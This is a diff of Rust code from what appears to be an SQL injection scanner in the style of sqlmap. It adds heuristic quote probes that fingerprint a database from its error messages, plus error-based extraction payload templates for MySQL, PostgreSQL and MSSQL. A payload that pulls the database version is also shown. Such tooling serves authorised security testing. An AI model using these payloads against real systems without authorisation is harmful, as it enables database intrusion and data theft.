@@ -14,8 +14,47 @@ pub struct ErrorVector {
     pub payload_template: String,
 }
 
-/// Check for error-based SQL injection
+/// Best-known error-based extraction template for a fingerprinted DBMS.
+/// Non-extractable DBMS get an empty template (detection still reported).
+fn template_for(dbms: DBMS) -> String {
+    match dbms {
+        DBMS::MySQL => "AND EXTRACTVALUE(1,CONCAT(0x7e,({QUERY}),0x7e))".to_string(),
+        DBMS::PostgreSQL => "AND 1=CAST(({QUERY}) AS INT)".to_string(),
+        DBMS::MSSQL => "AND 1=CONVERT(INT,({QUERY}))".to_string(),
+        _ => String::new(),
+    }
+}
+
+/// Check for error-based SQL injection.
+///
+/// First runs a heuristic, value-seeded probe and scans the response against the
+/// full DBMS error-signature table (29 DBMS, ported from sqlmap) — this confirms
+/// error-based injection and fingerprints the backend across far more databases
+/// than the handful of hardcoded checks below. The targeted MySQL/PG/MSSQL
+/// payloads then follow for extraction-ready vectors.
 pub async fn check_error_based(request: &Request<'_>) -> Result<Option<ErrorVector>> {
+    // ---- Heuristic signature probe (broad DBMS coverage) ----
+    let base = request.original_value();
+    let base = if base.trim().is_empty() { "1".to_string() } else { base };
+    let heuristic_probes = [
+        format!("{base}'"),
+        format!("{base}\""),
+        format!("{base}')"),
+        format!("{base}'\"`"),
+    ];
+    for probe in &heuristic_probes {
+        let page = request.query_page(probe).await?;
+        if let Some((name, dbms)) = crate::sqli::errors::detect_dbms_error(&page) {
+            tracing::info!("Error-based: matched {} error signature", name);
+            return Ok(Some(ErrorVector {
+                dbms,
+                prefix: format!("{base}'"),
+                suffix: "-- -".to_string(),
+                payload_template: template_for(dbms),
+            }));
+        }
+    }
+
     // MySQL error-based payloads
     let mysql_payloads = [
         "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))-- -",
